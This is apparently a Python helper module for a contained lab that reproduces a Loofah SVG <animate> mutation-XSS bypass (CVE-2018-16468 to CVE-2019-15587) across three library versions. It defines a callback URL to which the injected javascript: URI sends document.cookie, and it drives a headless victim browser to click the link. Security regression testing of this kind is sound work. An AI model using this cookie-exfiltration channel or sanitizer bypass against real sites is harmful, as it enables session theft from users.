#!/usr/bin/env python3
"""Shared orchestration for the Loofah SVG-animate-republish mutation-XSS canary
(CVE-2018-16468 -> CVE-2019-15587).

One "probe" = (1) reset the callback, (2) drive the headless victim to view the Loofah-republish
sink page `/?html=<payload>` on a version and click the SVG link, (3) read the callback. The
observable result is the callback dump; the per-run ${PCB_FLAG} appears there IFF Loofah's
republished output kept a smuggled `javascript:` URI in an SVG <animate> value attribute that
survived the allowlist, so clicking the animated <a> navigated to it and executed (proving
execution, not reflection).

Same sink (Loofah sanitize+republish), same exfil channel for seed and residual; the ONLY
difference is which <animate> value attribute carries the URI (`from` for the seed, `values` for
the residual) and which loofah version (v0/v1/v2) is the guard.
"""
import urllib.parse
import urllib.request

# Host-published ports (oracle / PoCs run on the host).
HOST_APP = {
    "v0": "http://127.0.0.1:35020",
    "v1": "http://127.0.0.1:35021",
    "v2": "http://127.0.0.1:35022",
}
# Internal compose URLs the victim browser uses (Docker DNS by service name).
INTERNAL_APP = {"v0": "http://v0", "v1": "http://v1", "v2": "http://v2"}
VICTIM = "http://127.0.0.1:35070"
CALLBACK = "http://127.0.0.1:35090"

# Internal callback the exfil payload navigates to (protocol-relative -> resolves to http on the
# victim page). The flag rides along as document.cookie.
CB = "//callback:9000/c?f="


def _get(url, timeout=120):
    with urllib.request.urlopen(url, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")


def run_payload(html_payload: str, version: str, visit_mode: str = "click") -> str:
    """Drive the victim to view the sink page with `html_payload` republished on `version`, click
    the SVG link, and return the callback dump (flag lands there iff the smuggled javascript: URI
    survived Loofah's animate-value allowlist and executed on click)."""
    _get(CALLBACK + "/reset")
    q_app = urllib.parse.urlencode({"html": html_payload})
    target = INTERNAL_APP[version] + "/?" + q_app
    q = urllib.parse.urlencode(
        {"target": target, "origin": INTERNAL_APP[version] + "/", "mode": visit_mode}
    )
    _get(VICTIM + "/visit?" + q)
    return _get(CALLBACK + "/dump")


def server_side_render(html_payload: str, version: str) -> str:
    """Return the exact server-side Loofah republish output (via /raw) for the repro log."""
    q = urllib.parse.urlencode({"html": html_payload})
    return _get(HOST_APP[version] + "/raw?" + q)
